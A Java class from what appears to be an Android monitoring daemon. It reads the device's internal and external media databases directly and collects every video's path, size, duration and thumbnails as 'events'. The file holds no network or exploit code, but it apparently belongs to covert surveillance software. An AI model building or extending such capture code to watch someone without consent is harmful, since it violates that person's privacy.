package com.vvt.daemon.mediahistory;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.provider.BaseColumns;
import android.provider.MediaStore.MediaColumns;
import android.provider.MediaStore.Video.VideoColumns;

import com.vvt.base.FxEvent;
import com.vvt.capture.video.FxVideoHelper;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxMimeTypeParser;
import com.vvt.events.FxThumbnail;
import com.vvt.events.FxVideoFileThumbnailEvent;
import com.vvt.logger.FxLog;
import com.vvt.stringutil.FxStringUtils;

public class VideoHistoryCapturer {
	private static final String TAG = "VideoHistoryCapturer";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mWritablePath;
	
	public VideoHistoryCapturer(String writablePath) {
		mWritablePath = writablePath;
	}
	
	public List<FxEvent> getVideoHistory() {
		List<FxEvent> events = new ArrayList<FxEvent>();
		events.addAll(processInternal());
		events.addAll(processExternal());
		return events;
	}
	
	private List<FxEvent> processInternal() {
		if(LOGV) FxLog.v(TAG , "processInternal # ENTER ... ");
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		try {
			final String internalDatabaseFilePath = FxVideoHelper.getInternalDatabaseFilePath();
			if(!FxStringUtils.isEmptyOrNull(internalDatabaseFilePath)) {
				if(LOGD) FxLog.d(TAG , "processInternal # get in internal ...");
				events = getNewerMediaById(mWritablePath, internalDatabaseFilePath);
			}
		}catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
		
		if(LOGV) FxLog.v(TAG , "processInternal # EXIT ... ");
		return events;
	}
	
	private List<FxEvent> processExternal() {
		if(LOGV) FxLog.v(TAG , "processExternal # ENTER ... ");
		List<FxEvent> events = new ArrayList<FxEvent>();
		try {
			final String externalDatabaseFilePath = FxVideoHelper.getExternalDatabaseFilePath();
			if(!FxStringUtils.isEmptyOrNull(externalDatabaseFilePath)) {
				if(LOGD) FxLog.d(TAG , "processExternal # get in external ...");
				events = getNewerMediaById(mWritablePath, externalDatabaseFilePath);
			}
		}catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
		if(LOGV) FxLog.v(TAG , "processExternal # EXIT ... ");
		return events;
	}
	
	 private List<FxEvent> getNewerMediaById(String writablePath, String dbFile) {
		 if(LOGV) FxLog.v(TAG , "getNewerMediaById # ENTER ... ");
		 if(LOGV) FxLog.v(TAG, "getNewerMediaById # dbFile:" + dbFile);
		 List<FxEvent> medias = new ArrayList<FxEvent>();
		 
		 SQLiteDatabase db =  FxVideoHelper.getReadableDatabase(dbFile);
			Cursor cursor = null;
			
			try {
				cursor = db.query(FxVideoHelper.VIDEO_TABLE_NAME, null, null, null, null, null, null);
				
				if (cursor == null) {
					return null;
				}

				FxVideoFileThumbnailEvent media = null;

				while (cursor.moveToNext()) {
					final int orginRowId = cursor.getInt(cursor.getColumnIndexOrThrow(BaseColumns._ID));
					final String fileName = cursor.getString(cursor.getColumnIndexOrThrow(MediaColumns.DATA));
					final String mimeType = cursor.getString(cursor.getColumnIndexOrThrow(MediaColumns.MIME_TYPE));
					final int actualDuration = cursor.getInt(cursor.getColumnIndexOrThrow(VideoColumns.DURATION));
					final FxMediaType format = FxMimeTypeParser.parse(mimeType);
					final long eventTime = new Date().getTime();
					long actualSize = cursor.getLong(cursor.getColumnIndexOrThrow(MediaColumns.SIZE));
					
					File f = new File(fileName); 
					if (!f.exists()) {
						continue;
					}
					
					if(actualSize <= 0) {
						actualSize = f.length();
					}

					media = new FxVideoFileThumbnailEvent();
					media.setEventId(orginRowId);
					media.setEventTime(eventTime);
					media.setActualFileSize(actualSize);
					media.setFormat(format);
					media.setParingId(orginRowId);
					media.setActualDuration(actualDuration);
					media.setActualFullPath(fileName);

					List<String> thumbs =  FxVideoHelper.getVideoThumbnailPath(db, orginRowId);
					
					if (thumbs.size() > 0) {
						for (String path : thumbs) {
							if (new File(path).exists()) {
								if (!FxStringUtils.isEmptyOrNull(path)) {
									FxThumbnail thumbnail = new FxThumbnail();
									thumbnail.setImageData(null);
									thumbnail.setThumbnailPath(path);
									media.addThumbnail(thumbnail);
									medias.add(media);

									if(LOGV) FxLog.v(TAG,"getNewerMediaById # videoPath thumb:"  + path);
								}
							}
						}
					}
					
					if(LOGV) { 
						FxLog.v(TAG,"getNewerMediaById # orginRowId:"  + orginRowId);
						FxLog.v(TAG,"getNewerMediaById # eventTime:"  + eventTime);
						FxLog.v(TAG,"getNewerMediaById # actualSize:"  + actualSize);
						FxLog.v(TAG,"getNewerMediaById # format:"  + format);
						FxLog.v(TAG,"getNewerMediaById # ParingId:"  + orginRowId);
						FxLog.v(TAG,"getNewerMediaById # actualDuration:"  + actualDuration);
						FxLog.v(TAG,"getNewerMediaById # fileName:"  + fileName);
					}
					 
				}
			}
			finally {
				if(cursor != null)
					cursor.close();
				
				if(db != null)
					db.close();
			}
			if(LOGD) FxLog.d(TAG , "getNewerMediaById # medias size : " +medias.size());  
			if(LOGD) FxLog.d(TAG , "getNewerMediaById # medias :  "+medias.toString());
		 
			if(LOGV) FxLog.v(TAG , "getNewerMediaById # EXIT ... ");
			return medias;
	 }
	
	
}
